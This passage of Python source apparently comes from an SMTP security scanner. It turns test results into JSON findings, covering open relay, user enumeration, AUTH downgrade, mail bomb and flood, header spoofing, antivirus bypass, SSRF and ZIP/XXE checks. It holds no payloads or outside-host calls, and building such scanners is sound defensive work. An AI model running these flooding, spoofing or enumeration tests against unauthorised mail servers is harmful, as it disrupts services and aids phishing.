                    "ehloProprietary": id_r.ehlo_proprietary,
                    "recommendation": id_r.recommendation,
                    "anomalousIdentity": id_r.anomalous_identity,
                    "bannerClaims": id_r.banner_claims,
                    "behaviorMatches": id_r.behavior_matches,
                    "tlsCertSubject": id_r.tls_cert_subject,
                    "tlsCertIssuer": id_r.tls_cert_issuer,
                    "tlsCertSan": id_r.tls_cert_san,
                    "tlsCertSelfSigned": id_r.tls_cert_self_signed,
                    "transportTls": getattr(id_r, "transport_tls", False),
                    "starttlsAdvertised": getattr(id_r, "starttls_advertised", False),
                    "tlsPolicy": getattr(id_r, "tls_policy", None),
                    "tlsCertWarnings": getattr(id_r, "tls_cert_warnings", None) or [],
                    "tlsCipherWarnings": getattr(id_r, "tls_cipher_warnings", None) or [],
                    "tlsDowngradeFindings": getattr(id_r, "tls_downgrade_findings", None) or [],
                    "tlsDowngradeProbed": getattr(id_r, "tls_downgrade_probed", False),
                    "osHint": getattr(id_r, "os_hint", None),
                    "dataLeakage": [
                        {
                            "email": x.email,
                            "risk": x.risk,
                            "sources": list(x.sources),
                            "targetDomainMatch": getattr(x, "target_domain_match", False),
                            "kind": getattr(x, "kind", "email"),
                        }
                        for x in (getattr(id_r, "data_leakage_findings", None) or ())
                    ],
                    "discrepancyDetected": getattr(id_r, "discrepancy_detected", False),
                    "discrepancyBannerProduct": getattr(id_r, "discrepancy_banner_product", None),
                    "discrepancyBehaviorProduct": getattr(id_r, "discrepancy_behavior_product", None),
                }
            elif (id_err := self.results.identify_error) is not None:
                props["serverIdentifyError"] = id_err
            if (br := self.results.bounce_replay) is not None:
                props["bounceReplay"] = {
                    "vulnerable": br.vulnerable,
                    "indeterminate": br.indeterminate,
                    "messageAccepted": br.message_accepted,
                    "messageAcceptedReturnPath": getattr(br, "message_accepted_return_path", False),
                    "rcptRejectedInSession": br.rcpt_rejected_in_session,
                    "bounceAddr": br.bounce_addr,
                    "recipientUsed": br.recipient_used,
                    "testId": br.test_id,
                    "testIdReturnPath": getattr(br, "test_id_return_path", "") or None,
                    "smtpTrace": list(br.smtp_trace),
                    "tarpittingOrTimeout": br.tarpitting_or_timeout,
                    "detail": br.detail,
                }
            elif (br_err := self.results.bounce_replay_error) is not None:
                props["bounceReplayError"] = br_err
            if (mb := self.results.mail_bomb) is not None:
                props["mailBomb"] = {
                    "vulnerable": mb.vulnerable,
                    "indeterminate": mb.indeterminate,
                    "partialProtection": mb.partial_protection,
                    "sent": mb.sent,
                    "delivered": mb.delivered,
                    "rateLimited": mb.rate_limited,
                    "blocked": mb.blocked,
                    "connectionLost": mb.connection_lost,
                    "firstRejectionAt": mb.first_rejection_at,
                    "elapsedSec": round(mb.elapsed_sec, 2),
                    "tarpittingDetected": mb.tarpitting_detected,
                    "lastError": mb.last_error,
                    "lastErrorType": mb.last_error_type or None,
                    "avgRttMs": round(mb.avg_rtt_ms, 1) if mb.avg_rtt_ms is not None else None,
                    "smtpTrace": list(mb.smtp_trace),
                    "perMessageDelivered": list(getattr(mb, "per_message_delivered", ()) or ()),
                    "abortedOnSmtp500": getattr(mb, "aborted_on_smtp_500", False),
                    "abortAtMessage": getattr(mb, "abort_at_message", None),
                    "detail": mb.detail,
                }
            elif (mb_err := self.results.mail_bomb_error) is not None:
                props["mailBombError"] = mb_err
            if (av := self.results.antivirus) is not None:
                props["antivirus"] = {
                    "vulnerable": av.vulnerable,
                    "indeterminate": av.indeterminate,
                    "partialProtection": av.partial_protection,
                    "elapsedSec": round(av.elapsed_sec, 2),
                    "detail": av.detail,
                    "categories": [
                        {
                            "category": c.category,
                            "sent": c.sent,
                            "accepted": c.accepted,
                            "rejected": c.rejected,
                            "error": c.error,
                            "smtpTrace": list(c.smtp_trace),
                            "detail": c.detail,
                        }
                        for c in av.categories
                    ],
                }
            elif (av_err := self.results.antivirus_error) is not None:
                props["antivirusError"] = av_err
            if (sh := self.results.spoof_header) is not None:
                props["spoofHeader"] = {
                    "vulnerable": sh.vulnerable,
                    "indeterminate": sh.indeterminate,
                    "elapsedSec": round(sh.elapsed_sec, 2),
                    "detail": sh.detail,
                    "vulnerableNote": sh.vulnerable_note,
                    "variants": [
                        {
                            "variant": v.variant,
                            "accepted": v.accepted,
                            "rejected": v.rejected,
                            "error": v.error,
                            "smtpStatus": v.smtp_status,
                            "smtpReply": v.smtp_reply,
                            "detail": v.detail,
                            "envelopeHeaderMismatch": v.envelope_header_mismatch,
                        }
                        for v in sh.variants
                    ],
                }
            elif (sh_err := self.results.spoof_header_error) is not None:
                props["spoofHeaderError"] = sh_err
            if (bc := self.results.bcc_test) is not None:
                props["bccTest"] = {
                    "messageAccepted": bc.message_accepted,
                    "smtpStatus": bc.smtp_status,
                    "smtpReply": bc.smtp_reply,
                    "recipientsTo": list(bc.recipients_to),
                    "recipientsCc": list(bc.recipients_cc),
                    "recipientsBcc": list(bc.recipients_bcc),
                    "elapsedSec": round(bc.elapsed_sec, 2),
                    "detail": bc.detail,
                    "verificationInstructions": bc.verification_instructions,
                }
            elif (bc_err := self.results.bcc_test_error) is not None:
                props["bccTestError"] = bc_err
            if (al := self.results.alias_test) is not None:
                props["aliasTest"] = {
                    "baseAddress": al.base_address,
                    "elapsedSec": round(al.elapsed_sec, 2),
                    "detail": al.detail,
                    "verificationInstructions": al.verification_instructions,
                    "variants": [
                        {
                            "variant": v.variant,
                            "address": v.address,
                            "accepted": v.accepted,
                            "rejected": v.rejected,
                            "error": v.error,
                            "smtpStatus": v.smtp_status,
                            "smtpReply": v.smtp_reply,
                            "detail": v.detail,
                            "uucpWarning": v.uucp_warning,
                        }
                        for v in al.variants
                    ],
                }
            elif (al_err := self.results.alias_test_error) is not None:
                props["aliasTestError"] = al_err
            if (fr := self.results.flood) is not None:
                props["flood"] = {
                    "vulnerable": fr.vulnerable,
                    "indeterminate": fr.indeterminate,
                    "partialProtection": fr.partial_protection,
                    "sizeAdvertised": fr.size_advertised,
                    "sizeLimitBytes": fr.size_limit_bytes,
                    "sizeLimitMb": round(fr.size_limit_bytes / 1048576, 2) if fr.size_limit_bytes else None,
                    "sizeEnforced": fr.size_enforced,
                    "messagesSent": fr.messages_sent,
                    "messagesAccepted": fr.messages_accepted,
                    "messagesRejected": fr.messages_rejected,
                    "queueAttempts": fr.queue_attempts,
                    "floodNotes": list(fr.flood_notes),
                    "firstRejectionAt": fr.first_rejection_at,
                    "tarpittingDetected": fr.tarpitting_detected,
                    "elapsedSec": round(fr.elapsed_sec, 2),
                    "smtpTrace": list(fr.smtp_trace),
                    "detail": fr.detail,
                }
            elif (flood_err := self.results.flood_error) is not None:
                props["floodError"] = flood_err
            self.ptjsonlib.add_properties(props)
            for v in flat_vulns:
                self.ptjsonlib.add_vulnerability(**v)
            self.ptjsonlib.set_status("finished", "")
            self.ptprint(self.ptjsonlib.get_result_json(), json=True)
            return

        # ── Enum-only: userAccount nodes + global vulns, no software node ──
        if self._is_enum_only_output():
            props: dict = {}
            if (catch_all := self.results.catch_all) is not None:
                desc_map = {"not_configured": "CatchAll not_configured", "configured": "CatchAll configured", "indeterminate": "CatchAll indeterminate"}
                props["description"] = desc_map.get(catch_all, f"CatchAll {catch_all}")
            if catch_all == "configured":
                props["enumerationNotes"] = (
                    "Results unreliable: Catch-all configured - all methods report as indeterminate (useless for enumeration)"
                )
            if (enum_err := self.results.enum_error) is not None:
                props["enumerationError"] = enum_err
            if props:
                self.ptjsonlib.add_properties(props)
            if (enum_results := self.results.enum_results) is not None:
                for e in enum_results:
                    if e.vulnerable and e.results is not None:
                        for user in sorted(e.results, key=str):
                            local_part = str(user).split("@")[0] if "@" in str(user) else str(user)
                            user_props = {"name": local_part, "email": str(user)}
                            user_node = self.ptjsonlib.create_node_object(
                                "userAccount",
                                parent_type="userAccounts",
                                parent=None,
                                properties=user_props,
                            )
                            self.ptjsonlib.add_node(user_node)
            _ENUM_VULN_MAP = {
                "EXPN": VULNS.UserEnumEXPN.value,
                "VRFY": VULNS.UserEnumVRFY.value,
                "RCPT": VULNS.UserEnumRCPT.value,
            }
            if enum_results is not None:
                catch_all_val = getattr(self.results, "catch_all", None)
                if self.args.enumerate is None:
                    requested_set = {"EXPN", "VRFY", "RCPT"}
                elif isinstance(self.args.enumerate, list):
                    requested_set = {m.upper() for m in self.args.enumerate if m}
                else:
                    requested_set = {self.args.enumerate.upper()} if self.args.enumerate else {"EXPN", "VRFY", "RCPT"}
                filtered = [e for e in enum_results if e.method.upper() in requested_set]
                for e in filtered:
                    vulnerable = False if catch_all_val == "configured" else e.vulnerable
                    if vulnerable:
                        vc = _ENUM_VULN_MAP.get(e.method.upper())
                        if vc:
                            self.ptjsonlib.add_vulnerability(vuln_code=vc)
            self.ptjsonlib.set_status("finished", "")
            self.ptprint(self.ptjsonlib.get_result_json(), json=True)
            return

        # ── Node-based output: software node + optional userAccount nodes ──
        properties = {
            "software_type": None,
            "name": "smtp",
            "version": None,
            "vendor": None,
            "description": None,
        }
        global_vulns: list[dict] = []

        if getattr(self, "run_all_mode", False) and (resolved := getattr(self.results, "resolved_domain", None)) is not None:
            properties.update({"resolvedDomain": resolved})

        # 1. Banner
        if self.results.banner_requested:
            if (info := self.results.info) and info.banner is not None:
                sid = identify_service(info.banner)
                vendor = _vendor_from_cpe(sid.cpe) if sid else None
                version = sid.version if sid else None
                properties.update(
                    {
                        "description": f"Banner: {info.banner}",
                        "version": version,
                        "vendor": vendor,
                    }
                )
                if sid is not None:
                    if sid.version is not None:
                        global_vulns.append({"vuln_code": VULNS.Banner.value})
                    properties.update({"cpe": sid.cpe})

        # 2. EHLO extensions
        if self.results.commands_requested:
            if (info := self.results.info) and info.ehlo is not None:
                ehlo_starttls = getattr(info, "ehlo_starttls", None)
                if ehlo_starttls:
                    properties.update(
                        {"ehloCommand": info.ehlo, "ehloCommandStarttls": ehlo_starttls}
                    )
                else:
                    properties.update({"ehloCommand": info.ehlo})

        # Role identification
        if (role_error := self.results.role_error) is not None:
            properties.update({"roleError": role_error})
        elif (role_r := self.results.role) is not None:
            properties.update({
                "identifiedRole": {
                    "role": role_r.role,
                    "portHint": role_r.port_hint,
                    "authAdvertised": role_r.auth_advertised,
                    "authRequired": role_r.auth_required,
                    "detail": role_r.detail,
                }
            })
            if role_r.role == "hybrid":
                global_vulns.append({
                    "vuln_code": VULNS.HybridRole.value,
                    "vuln_request": f"Role identification on port {self.args.target.port}",
                    "vuln_response": (
                        f"Hybrid (MTA + Submission) -- consider separating roles\n"
                        f"{role_r.detail}"
                    ),
                })

        # Encryption
        if (encryption_error := self.results.encryption_error) is not None:
            properties.update({"encryptionError": encryption_error})
        elif (enc := self.results.encryption) is not None:
            properties.update(
                {
                    "encryption": {
                        "plaintext": enc.plaintext_ok,
                        "starttls": enc.starttls_ok,
                        "tls": enc.tls_ok,
                    }
                }
            )
            if enc.plaintext_ok:
                global_vulns.append({"vuln_code": VULNS.CryptOnly.value})

        # Open relay
        if (open_relay_error := self.results.open_relay_error) is not None:
            properties.update({"openRelayError": open_relay_error})
        elif (open_relay := self.results.open_relay) is not None:
            if open_relay:
                global_vulns.append(
                    {"vuln_code": VULNS.OpenRelay.value, "vuln_request": "Open relay"}
                )

        # Catch All mailbox
        if (catch_all := self.results.catch_all) is not None:
            properties.update({"catchAll": catch_all})

        # RCPT TO limit
        rcptmax_advertised = None
        if (info := getattr(self.results, "info", None)) and getattr(info, "ehlo", None):
            rcptmax_advertised = _parse_rcptmax_from_ehlo(info.ehlo)
        if (rcpt_limit_err := self.results.rcpt_limit_error) is not None:
            if rcptmax_advertised is not None:
                properties.update({"rcptLimitAdvertised": rcptmax_advertised})
            properties.update({"rcptLimitError": rcpt_limit_err})
        elif (rlim := self.results.rcpt_limit) is not None:
            if rcptmax_advertised is not None:
                properties.update({"rcptLimitAdvertised": rcptmax_advertised})
            if getattr(rlim, "rejected_addresses", False):
                rcpt_obj: dict = {"rejectedAddresses": True, "serverResponse": rlim.server_response}
                if getattr(rlim, "no_session_limit", False):
                    rcpt_obj["noSessionLimit"] = True
                    rcpt_obj["failedBeforeLimit"] = getattr(rlim, "failed_before_limit", 0)
                    global_vulns.append(
                        {
                            "vuln_code": VULNS.NoSessionLimit.value,
                            "vuln_request": "RCPT TO limit test (session error limit)",
                            "vuln_response": f"Server allows {rcpt_obj['failedBeforeLimit']} failed RCPT attempts without disconnect (no smtpd_hard_error_limit)",
                        }
                    )
                properties.update({"rcptLimit": rcpt_obj})
            elif getattr(rlim, "session_limit_triggered", False):
                properties.update(
                    {
                        "rcptLimit": {
                            "sessionLimitTriggered": True,
                            "failedBeforeLimit": getattr(rlim, "failed_before_limit", 0),
                            "maxAccepted": rlim.max_accepted,
                            "serverResponse": rlim.server_response,
                        }
                    }
                )
            elif rlim.limit_triggered:
                properties.update(
                    {"rcptLimit": {"maxAccepted": rlim.max_accepted, "limitTriggered": True}}
                )
            else:
                if rlim.max_accepted == 0:
                    properties.update(
                        {"rcptLimit": {"maxAccepted": 0, "limitTriggered": False, "couldNotTest": True}}
                    )
                else:
                    properties.update(
                        {"rcptLimit": {"maxAccepted": rlim.max_accepted, "limitTriggered": False}}
                    )

        # Blacklist information
        if (blacklist_error := self.results.blacklist_error) is not None:
            properties.update({"blacklistError": blacklist_error})
        elif self.results.blacklist_private_ip_skipped:
            properties.update({"blacklistSkipped": "private_ip"})
        elif blacklist := self.results.blacklist:
            if blacklist.listed:
                json_lines: list[str] = []
                if (results := blacklist.results) is not None:
                    for r in results:
                        json_lines.append(f'{r.blacklist.strip()}: "{r.reason}" (TTL={r.ttl})')
                    if len(json_lines) > 0:
                        global_vulns.append(
                            {
                                "vuln_code": VULNS.Blacklist.value,
                                "vuln_request": f"blacklists containing target {self.target}",
                                "vuln_response": "\n".join(json_lines),
                            }
                        )

        # SPF records
        if (spf_error := self.results.spf_error) is not None:
            properties.update({"spfError": spf_error})
        elif self.results.spf_requires_domain:
            properties.update({"spfSkipped": "requires_domain"})
        elif (spf_records := self.results.spf_records) is not None:
            json_lines = []
            for ns, records in spf_records.items():
                for r in records:
                    json_lines.append(f"[{ns}] {r}")
            if len(json_lines) > 0:
                properties.update({"spfRecords": "\n".join(json_lines)})

        # User enumeration methods
        _ENUM_VULN_MAP = {
            "EXPN": VULNS.UserEnumEXPN.value,
            "VRFY": VULNS.UserEnumVRFY.value,
            "RCPT": VULNS.UserEnumRCPT.value,
        }
        if (enum_error := self.results.enum_error) is not None:
            properties.update({"enumerationError": enum_error})
        elif (enum_results := self.results.enum_results) is not None:
            catch_all = getattr(self.results, "catch_all", None)
            if self.args.enumerate is None:
                requested_set = {"EXPN", "VRFY", "RCPT"}
            elif isinstance(self.args.enumerate, list):
                requested_set = {m.upper() for m in self.args.enumerate if m}
            else:
                requested_set = {self.args.enumerate.upper()} if self.args.enumerate else {"EXPN", "VRFY", "RCPT"}
            filtered = [e for e in enum_results if e.method.upper() in requested_set]
            if catch_all == "configured":
                properties.update(
                    {
                        "enumerationNotes": "Results unreliable: Catch-all configured - all methods report as indeterminate (useless for enumeration)",
                    }
                )
            for e in filtered:
                vulnerable = False if catch_all == "configured" else e.vulnerable
                if vulnerable:
                    vuln_code = _ENUM_VULN_MAP.get(e.method.upper())
                    if vuln_code:
                        global_vulns.append({"vuln_code": vuln_code})

        # NTLM information
        if (ntlm_error := self.results.ntlm_error) is not None:
            properties.update({"ntlmError": ntlm_error})
        elif ntlm := self.results.ntlm:
            if not ntlm.success:
                properties.update({"ntlmInfoStatus": "failed"})
            elif ntlm.ntlm is not None:
                properties.update({"ntlmInfoStatus": "ok"})
                out_lines = [
                    f"Target name: {ntlm.ntlm.target_name}",
                    f"NetBios domain name: {ntlm.ntlm.netbios_domain}",
                    f"NetBios computer name: {ntlm.ntlm.netbios_computer}",
                    f"DNS domain name: {ntlm.ntlm.dns_domain}",
                    f"DNS computer name: {ntlm.ntlm.dns_computer}",
                    f"DNS tree: {ntlm.ntlm.dns_tree}",
                    f"OS version: {ntlm.ntlm.os_version}",
                ]
                global_vulns.append(
                    {
                        "vuln_code": VULNS.NTLM.value,
                        "vuln_request": "ntlm authentication",
                        "vuln_response": "\n".join(out_lines),
                    }
                )

        # HELO/EHLO hostname validation
        if (helo_err := self.results.helo_validation_error) is not None:
            properties.update({"heloValidationError": helo_err})
        elif (hv := self.results.helo_validation) is not None:
            hv_props: dict = {
                "vulnerable": hv.vulnerable,
                "weakConfig": hv.weak_config,
                "indeterminate": hv.indeterminate,
                "acceptedVectors": hv.accepted_vectors,
                "rejectedVectors": hv.rejected_vectors,
                "detail": hv.detail,
            }
            if hv.ehlo_bypass is not None:
                hv_props["ehloBypass"] = hv.ehlo_bypass
            if hv.ehlo_comparison:
                hv_props["ehloComparison"] = hv.ehlo_comparison
            properties.update({"heloValidation": hv_props})
            if hv.vulnerable or hv.ehlo_bypass:
                global_vulns.append(
                    {
                        "vuln_code": VULNS.HeloNoValidation.value,
                        "vuln_request": "HELO/EHLO hostname validation",
                        "vuln_response": hv.detail or "",
                    }
                )

        # AUTH downgrade
        if (ad_err := self.results.auth_downgrade_error) is not None:
            properties.update({"authDowngradeError": ad_err})
        elif (ad := self.results.auth_downgrade) is not None:
            ad_props: dict = {
                "vulnerable": ad.vulnerable,
                "weakness": ad.weakness,
                "indeterminate": ad.indeterminate,
                "infoDefensive": ad.info_defensive,
                "methodsBefore": ad.methods_before,
                "methodsAfter": ad.methods_after,
                "authMethodUsed": ad.auth_method_used,
                "detail": ad.detail,
            }
            if ad.server_response is not None:
                ad_props["serverResponse"] = ad.server_response
            if ad.rset_ok is not None:
                ad_props["rsetOk"] = ad.rset_ok
            properties.update({"authDowngrade": ad_props})
            if ad.vulnerable:
                global_vulns.append(
                    {
                        "vuln_code": VULNS.AuthDowngrade.value,
                        "vuln_request": f"AUTH {ad.auth_method_used} (bogus token)",
                        "vuln_response": ad.detail or "",
                    }
                )

        # AUTH LOGIN format (PTL-SVC-SMTP-AUTH-FORMAT)
        if (af_err := self.results.auth_format_error) is not None:
            properties.update({"authFormatError": af_err})
        elif (af := self.results.auth_format) is not None:
            properties.update(
                {
                    "authFormat": {
                        "testId": "PTL-SVC-SMTP-AUTH-FORMAT",
                        "methodTested": af.method_tested,
                        "conclusion": af.conclusion,
                        "conclusionId": af.conclusion_id,
                        "targetDomainUsed": af.target_domain_used,
                        "targetDomainSource": af.target_domain_source,
                        "targetDomainAnalystNote": af.target_domain_analyst_note,
                        "targetDomainEhloHostname": af.target_domain_ehlo_hostname,
                        "targetDomainScanHostname": af.target_domain_scan_hostname,
                        "netbiosDomainUsed": af.netbios_domain_used,
                        "challengeDecoded": af.challenge_decoded,
                        "challengeHint": af.challenge_hint,
                        "rateLimited": af.rate_limited,
                        "indeterminate": af.indeterminate,
                        "probes": [
                            {
                                "id": r.probe_id,
                                "label": r.label,
                                "identity": r.identity,
                                "skipped": r.skipped,
                                "skipReason": r.skip_reason,
                                "codeAfterIdentity": r.code_after_identity,
                                "passwordPhase": r.password_phase,
                                "codeAfterPassword": r.code_after_password,
                                "replyAfterIdentity": r.reply_after_identity,
                                "rateLimited": r.rate_limited,
                            }
                            for r in af.rows
                        ],
                    }
                }
            )

        # Invalid commands (PTL-SVC-SMTP-INVCOMM)
        if (ic_err := self.results.inv_comm_error) is not None:
            properties.update({"invalidCommandsError": ic_err})
        elif (ic := self.results.inv_comm) is not None:
            ic_props: dict = {
                "vulnerable": ic.vulnerable,
                "weakness": ic.weakness,
                "indeterminate": ic.indeterminate,
                "detail": ic.detail,
                "baselineLatencySec": getattr(ic, "baseline_latency_sec", None),
                "tarpittingDetected": getattr(ic, "tarpitting_detected", False),
                "tests": [
                    {
                        "category": t.category,
                        "command": t.command_display,
                        "status": t.status,
                        "reply": t.reply,
                        "sessionOk": t.session_ok,
                        "infoLeak": t.info_leak,
                        "vulnerable": t.vulnerable,
                        "vulnType": getattr(t, "vuln_type", None),
                        "responseTimeSec": getattr(t, "response_time_sec", None),
                        "slowResponse": getattr(t, "slow_response", False),
                    }
                    for t in ic.tests
                ],
            }
            properties.update({"invalidCommands": ic_props})
            if ic.vulnerable:
                global_vulns.append(
                    {
                        "vuln_code": VULNS.InvComm.value,
                        "vuln_request": "Invalid/non-standard SMTP commands",
                        "vuln_response": ic.detail or "",
                    }
                )

        # HELO-only (PTL-SVC-SMTP-HELOONLY)
        if (ho_err := self.results.helo_only_error) is not None:
            properties.update({"heloOnlyError": ho_err})
        elif (ho := self.results.helo_only) is not None:
            ho_props: dict = {
                "vulnerable": ho.vulnerable,
                "indeterminate": ho.indeterminate,
                "heloStatus": ho.helo_status,
                "ehloStatus": ho.ehlo_status,
                "extensions": list(ho.extensions),
                "connectionType": ho.connection_type,
                "detail": ho.detail,
            }
            properties.update({"heloOnly": ho_props})
            if ho.vulnerable:
                global_vulns.append(
                    {
                        "vuln_code": VULNS.HeloOnly.value,
                        "vuln_request": "EHLO test.local",
                        "vuln_response": ho.detail or "",
                    }
                )

        # HELO bypass (PTL-SVC-SMTP-HELO)
        if (hb_err := self.results.helo_bypass_error) is not None:
            properties.update({"heloBypassError": hb_err})
        elif (hb := self.results.helo_bypass) is not None:
            hb_props: dict = {
                "vulnerable": hb.vulnerable,
                "indeterminate": hb.indeterminate,
                "submissionBypassEhlo": list(hb.submission_bypass_ehlo),
                "relayBypassEhlo": list(hb.relay_bypass_ehlo),
                "acceptsInvalidFormat": list(hb.accepts_invalid_format),
                "ehloConsistent": hb.ehlo_consistent,
                "tarpittingDetected": list(hb.tarpitting_detected),
                "detail": hb.detail,
            }
            properties.update({"heloBypass": hb_props})
            if hb.vulnerable:
                bypass_ehlo = ", ".join(hb.submission_bypass_ehlo + hb.relay_bypass_ehlo)
                global_vulns.append(
                    {
                        "vuln_code": VULNS.HeloBypass.value,
                        "vuln_request": f"EHLO {bypass_ehlo}\nMAIL FROM:<tester@example.com>\nRCPT TO:<external-test@gmail.com>",
                        "vuln_response": hb.detail or "",
                    }
                )

        # Bounce replay (PTL-SVC-SMTP-REPLAY)
        if (br_err := self.results.bounce_replay_error) is not None:
            properties.update({"bounceReplayError": br_err})
        elif (br := self.results.bounce_replay) is not None:
            br_props: dict = {
                "vulnerable": br.vulnerable,
                "indeterminate": br.indeterminate,
                "messageAccepted": br.message_accepted,
                "messageAcceptedReturnPath": getattr(br, "message_accepted_return_path", False),
                "rcptRejectedInSession": br.rcpt_rejected_in_session,
                "bounceAddr": br.bounce_addr,
                "recipientUsed": br.recipient_used,
                "testId": br.test_id,
                "testIdReturnPath": getattr(br, "test_id_return_path", "") or None,
                "smtpTrace": list(br.smtp_trace),
                "tarpittingOrTimeout": br.tarpitting_or_timeout,
                "detail": br.detail,
            }
            properties.update({"bounceReplay": br_props})
            if br.message_accepted or getattr(br, "message_accepted_return_path", False):
                global_vulns.append(
                    {
                        "vuln_code": VULNS.BounceReplay.value,
                        "vuln_request": f"MAIL FROM:<{br.bounce_addr}>\nRCPT TO:<{br.recipient_used}>",
                        "vuln_response": br.detail or "",
                    }
                )

        # Mail bomb (PTL-SVC-SMTP-BOMB)
        if (mb_err := self.results.mail_bomb_error) is not None:
            properties.update({"mailBombError": mb_err})
        elif (mb := self.results.mail_bomb) is not None:
            mb_props: dict = {
                "vulnerable": mb.vulnerable,
                "indeterminate": mb.indeterminate,
                "partialProtection": mb.partial_protection,
                "sent": mb.sent,
                "delivered": mb.delivered,
                "rateLimited": mb.rate_limited,
                "blocked": mb.blocked,
                "connectionLost": mb.connection_lost,
                "firstRejectionAt": mb.first_rejection_at,
                "elapsedSec": round(mb.elapsed_sec, 2),
                "tarpittingDetected": mb.tarpitting_detected,
                "lastError": mb.last_error,
                "lastErrorType": mb.last_error_type or None,
                "avgRttMs": round(mb.avg_rtt_ms, 1) if mb.avg_rtt_ms is not None else None,
                "smtpTrace": list(mb.smtp_trace),
                "perMessageDelivered": list(getattr(mb, "per_message_delivered", ()) or ()),
                "abortedOnSmtp500": getattr(mb, "aborted_on_smtp_500", False),
                "abortAtMessage": getattr(mb, "abort_at_message", None),
                "detail": mb.detail,
            }
            properties.update({"mailBomb": mb_props})
            if mb.vulnerable:
                global_vulns.append(
                    {
                        "vuln_code": VULNS.Bomb.value,
                        "vuln_request": f"Flood of {mb.sent} messages to {self.args.rcpt_to}",
                        "vuln_response": mb.detail or "",
                    }
                )

        # Antivirus (PTL-SVC-SMTP-ANTIVIRUS)
        if (av_err := self.results.antivirus_error) is not None:
            properties.update({"antivirusError": av_err})
        elif (av := self.results.antivirus) is not None:
            properties.update({
                "antivirus": {
                    "vulnerable": av.vulnerable,
                    "indeterminate": av.indeterminate,
                    "partialProtection": av.partial_protection,
                    "elapsedSec": round(av.elapsed_sec, 2),
                    "detail": av.detail,
                    "categories": [
                        {
                            "category": c.category,
                            "sent": c.sent,
                            "accepted": c.accepted,
                            "rejected": c.rejected,
                            "error": c.error,
                            "smtpTrace": list(c.smtp_trace),
                            "detail": c.detail,
                        }
                        for c in av.categories
                    ],
                }
            })
            if av.vulnerable:
                global_vulns.append(
                    {
                        "vuln_code": VULNS.Antivirus.value,
                        "vuln_request": f"E-mail with malicious content to {self.args.rcpt_to}",
                        "vuln_response": av.detail or "Risky content accepted at MTA",
                    }
                )

        # SSRF (PTL-SVC-SMTP-SSRF)
        if (ssrf_err := self.results.ssrf_error) is not None:
            properties.update({"ssrfError": ssrf_err})
        elif (sr := self.results.ssrf) is not None:
            properties.update({
                "ssrf": {
                    "manualVerificationRequired": sr.manual_verification_required,
                    "canaryUrl": sr.canary_url,
                    "elapsedSec": round(sr.elapsed_sec, 2),
                    "detail": sr.detail,
                    "verificationInstructions": sr.verification_instructions,
                    "variants": [
                        {
                            "variant": v.variant,
                            "sent": v.sent,
                            "accepted": v.accepted,
                            "rejected": v.rejected,
                            "error": v.error,
                            "smtpTrace": list(v.smtp_trace),
                            "detail": v.detail,
                        }
                        for v in sr.variants
                    ],
                }
            })

        # FLOOD (PTL-SVC-SMTP-FLOOD)
        if (flood_err := self.results.flood_error) is not None:
            properties.update({"floodError": flood_err})
        elif (fr := self.results.flood) is not None:
            properties.update({
                "flood": {
                    "vulnerable": fr.vulnerable,
                    "indeterminate": fr.indeterminate,
                    "partialProtection": fr.partial_protection,
                    "sizeAdvertised": fr.size_advertised,
                    "sizeLimitBytes": fr.size_limit_bytes,
                    "sizeLimitMb": round(fr.size_limit_bytes / 1048576, 2) if fr.size_limit_bytes else None,
                    "sizeEnforced": fr.size_enforced,
                    "messagesSent": fr.messages_sent,
                    "messagesAccepted": fr.messages_accepted,
                    "messagesRejected": fr.messages_rejected,
                    "queueAttempts": fr.queue_attempts,
                    "floodNotes": list(fr.flood_notes),
                    "firstRejectionAt": fr.first_rejection_at,
                    "tarpittingDetected": fr.tarpitting_detected,
                    "elapsedSec": round(fr.elapsed_sec, 2),
                    "smtpTrace": list(fr.smtp_trace),
                    "detail": fr.detail,
                }
            })
            if fr.vulnerable:
                global_vulns.append(
                    {
                        "vuln_code": VULNS.Flood.value,
                        "vuln_request": f"Queue flood ({fr.queue_attempts} attempts, {fr.messages_accepted} delivered) + SIZE test",
                        "vuln_response": fr.detail or "Server accepts excessive messages or SIZE not enforced",
                    }
                )

        # ZIPXXE (PTL-SVC-SMTP-ZIPXXE)
        if (zipxxe_err := self.results.zipxxe_error) is not None:
            properties.update({"zipxxeError": zipxxe_err})
        elif (zr := self.results.zipxxe) is not None:
            properties.update({
                "zipxxe": {
                    "manualVerificationRequired": zr.manual_verification_required,
                    "canaryUrl": zr.canary_url or None,
                    "elapsedSec": round(zr.elapsed_sec, 2),
                    "detail": zr.detail,
                    "allRejectedAtRcpt": zr.all_rejected_at_rcpt,
                    "verificationInstructions": zr.verification_instructions,
                    "variants": [
                        {
                            "variant": v.variant,
                            "sent": v.sent,
                            "accepted": v.accepted,
                            "rejected": v.rejected,
                            "error": v.error,
                            "smtpTrace": list(v.smtp_trace),
                            "detail": v.detail,
                        }
                        for v in zr.variants
                    ],
                }
            })

        # SPOOFHDR
        if (sh_err := self.results.spoof_header_error) is not None:
            properties.update({"spoofHeaderError": sh_err})
        elif (sh := self.results.spoof_header) is not None:
            properties.update({
                "spoofHeader": {
                    "vulnerable": sh.vulnerable,
                    "indeterminate": sh.indeterminate,
                    "elapsedSec": round(sh.elapsed_sec, 2),
                    "detail": sh.detail,
                    "vulnerableNote": sh.vulnerable_note,
                    "variants": [
                        {
                            "variant": v.variant,
                            "accepted": v.accepted,
                            "rejected": v.rejected,
                            "error": v.error,
                            "smtpStatus": v.smtp_status,
                            "smtpReply": v.smtp_reply,
                            "detail": v.detail,
                            "envelopeHeaderMismatch": v.envelope_header_mismatch,
                        }
                        for v in sh.variants
                    ],
                }
            })
            if sh.vulnerable:
                global_vulns.append(
                    {
                        "vuln_code": VULNS.SpoofHeader.value,
                        "vuln_request": f"E-mail with spoofed From/Reply-To/Return-Path headers to {self.args.rcpt_to}",
                        "vuln_response": sh.detail or "Message accepted (250 OK) – server delivers spoofed headers",
                        "vuln_note": sh.vulnerable_note,
                    }
                )

        # BCC (PTL-SVC-SMTP-BCC) – manual verification, no auto vuln
        if (bc_err := self.results.bcc_test_error) is not None:
            properties.update({"bccTestError": bc_err})
        elif (bc := self.results.bcc_test) is not None:
            properties.update({
                "bccTest": {
                    "messageAccepted": bc.message_accepted,
                    "smtpStatus": bc.smtp_status,
                    "smtpReply": bc.smtp_reply,
                    "recipientsTo": list(bc.recipients_to),
                    "recipientsCc": list(bc.recipients_cc),
                    "recipientsBcc": list(bc.recipients_bcc),
                    "elapsedSec": round(bc.elapsed_sec, 2),
                    "detail": bc.detail,
                    "verificationInstructions": bc.verification_instructions,
                }
            })

        # Alias (PTL-SVC-SMTP-ALIAS) – manual verification, no auto vuln
        if (al_err := self.results.alias_test_error) is not None:
